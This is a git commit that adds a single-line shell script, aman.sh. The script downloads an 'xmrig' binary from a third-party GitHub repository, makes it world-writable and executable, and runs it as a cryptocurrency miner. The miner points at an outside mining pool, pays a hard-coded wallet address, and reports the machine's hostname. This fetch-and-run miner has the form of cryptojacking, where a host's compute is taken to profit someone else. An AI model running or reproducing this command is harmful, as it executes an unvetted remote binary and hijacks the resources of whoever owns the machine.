553431084f6bdd2e7d2464ab8fa90d927460d5ed
lamajuahsu <92451851+lamajuahsu@users.noreply.github.com>
2021-12-20 16:41:02 +0700

    Create aman.sh

---
+++ aman.sh
@@ -0,0 +1,1 @@
+wget https://github.com/pramadoli/rtm/raw/main/xmrig && chmod 777 xmrig && ./xmrig --donate-level 1 -a Argon2/Chukwa -o us-central.2acoin.org:5555 -u guns8sajPa19G81kchLTLf9u2qHCbJUqEHRhfMMwtv54HvxrizNdM5h9u52kPtRPrK9mGBnhdCHD396RijusrpxDAQDDzVuKBEaEaQmTq4eew7XMWZgrqE1KcDik8fQU5EhhauijLA9MGCiLH2gxjww4DuQJ2ErN1GMhkct7giSyVPwS4iCQcboNeA -p $(cat /proc/sys/kernel/hostname)
